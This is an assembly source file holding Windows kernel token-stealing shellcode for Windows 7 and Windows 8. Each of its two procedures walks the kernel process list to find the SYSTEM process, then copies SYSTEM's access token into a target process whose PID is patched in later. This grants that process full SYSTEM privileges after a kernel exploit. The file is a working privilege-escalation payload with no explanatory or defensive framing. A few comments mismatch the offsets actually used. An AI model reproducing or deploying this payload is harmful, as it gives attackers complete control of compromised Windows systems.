.code

ReplaceToken_Win7 PROC

;---------------------------------- Get System Process----------------------------------------------
_start1:
	mov   rax,qword ptr gs:[188h]        ; Current thread (_KTHREAD)
	mov   rax,qword ptr [rax+70h]        ; Current process (_EPROCESS) 
	mov rbx, rax                         ; Copy current process (_EPROCESS) to rbx
__loop1:
	mov rbx, qword ptr [rbx + 188h]      ; ActiveProcessLinks
	sub rbx, 188h                        ; Go back to current process (_EPROCESS)
	mov rdx, qword ptr [rbx + 180h]      ; UniqueProcessId (PID)
	cmp rdx, 4	                         ; Compare PID to PID ,rcx has the process ID of target process passesd parameter
	jnz __loop1                           ; Loop until SYSTEM PID is found
	mov rcx, rbx                         ; Copy process (_EPROCESS) to rbx

;--------------------------------- Get Target Process -----------------------------------------------
_start2:
	mov   rax,qword ptr gs:[188h]        ; Current thread (_KTHREAD)
	mov   rax,qword ptr [rax+70h]        ; Current process (_EPROCESS)
	mov rbx, rax                         ; Copy current process (_EPROCESS) to rbx
__loop2:
	mov rbx, qword ptr [rbx + 188h]      ; ActiveProcessLinks
	sub rbx, 188h                        ; Go back to current process (_EPROCESS)
	mov rdx, qword ptr [rbx + 180h]      ; UniqueProcessId (PID)
	cmp rdx, 0deaddafeh	                 ; Compare PID to PID ,0deaddafeh is PID of target process
	jnz __loop2                          ; Loop until SYSTEM PID is found
	mov rdx, rbx                         ; Copy process (_EPROCESS) to rdx

;----------------------------------- Replace Token ----------------------------------------------
	mov rax, qword ptr [rcx + 208h]      ; SYSTEM token is @ offset _EPROCESS + 0x208
	and al, 0f0h
	mov qword ptr [rdx + 208h], rax      ; Copy SYSTEM token to current process

	;trigger excwption to user space
	push    rax
	push    80h
	pop     rax
	add     rsp, rax
	mov     qword ptr [rax], rax
	nop
	nop
	nop
	nop
ReplaceToken_Win7 ENDP

ReplaceToken_Win8 PROC

;---------------------------------- Get System Process----------------------------------------------
_start1:
	mov   rax,qword ptr gs:[188h]        ; Current thread (_KTHREAD)
	mov   rax,qword ptr [rax+0B8h]        ; Current process (_EPROCESS) 
	mov rbx, rax                         ; Copy current process (_EPROCESS) to rbx
__loop1:
	mov rbx, qword ptr [rbx + 2e8h]      ; ActiveProcessLinks
	sub rbx, 2e8h                        ; Go back to current process (_EPROCESS)
	mov rdx, qword ptr [rbx + 2e0h]      ; UniqueProcessId (PID)
	cmp rdx, 4	                         ; Compare PID to PID ,rcx has the process ID of target process passesd parameter
	jnz __loop1                           ; Loop until SYSTEM PID is found
	mov rcx, rbx                         ; Copy process (_EPROCESS) to rbx

;--------------------------------- Get Target Process -----------------------------------------------
_start2:
	mov   rax,qword ptr gs:[188h]        ; Current thread (_KTHREAD)
	mov   rax,qword ptr [rax+0B8h]        ; Current process (_EPROCESS)
	mov rbx, rax                         ; Copy current process (_EPROCESS) to rbx
__loop2:
	mov rbx, qword ptr [rbx + 2e8h]      ; ActiveProcessLinks
	sub rbx, 2e8h                        ; Go back to current process (_EPROCESS)
	mov rdx, qword ptr [rbx + 2e0h]      ; UniqueProcessId (PID)
	cmp rdx, 0deaddafeh	                 ; Compare PID to PID ,0deaddafeh is PID of target process
	jnz __loop2                          ; Loop until SYSTEM PID is found
	mov rdx, rbx                         ; Copy process (_EPROCESS) to rdx

;----------------------------------- Replace Token ----------------------------------------------
	mov rax, qword ptr [rcx + 348h]      ; SYSTEM token is @ offset _EPROCESS + 0x208
	and al, 0f0h
	mov qword ptr [rdx + 348h], rax      ; Copy SYSTEM token to current process

	add rsp , 1c8h
	ret

	nop
	nop
	nop
	nop
ReplaceToken_Win8 ENDP

END


